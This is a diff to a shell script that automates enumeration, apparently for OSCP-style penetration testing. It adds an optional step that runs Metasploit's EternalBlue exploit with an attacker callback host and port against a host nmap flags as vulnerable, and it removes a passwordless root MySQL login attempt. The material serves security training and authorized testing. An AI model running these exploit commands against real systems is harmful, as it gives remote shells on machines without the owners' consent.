@@ -208,6 +208,14 @@ sleep 1
 if grep "CVE:CVE-2017-0143" $DOMAINIP.txt
 then
 	echo -e '\E[31;40m'"Most likley vulnerable to Eternal Blue"
+	read -p "Would you like to automatically exploit Eternal Blue with Metasploit? MAY NOT BE ALLOWED FOR OSCP (y/n)" answer
+	if [ $answer = y ] ; then
+		echo "LHOST?"
+		read LHOST
+		echo "LPORT?"
+		read LPORT
+		msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set LHOST $LHOST;set RHOSTS $DOMAINIP; set LPORT $LPORT; exploit"
+	fi
 fi
 sleep 1
 
@@ -223,8 +231,6 @@ if grep 3306/tcp $DOMAINIP.txt
 then
 	echo -e '\E[31;35m' "MySQL is open, trying some stuff"; tput sgr0
 	nmap --script=mysql-* >> DOMAINIP.txt
-	echo -e '\E[31;35m' "Trying to login to MySQL with no password and username root"
-	mysql -h $DOMAINIP -u root 
 fi
 sleep 1
 
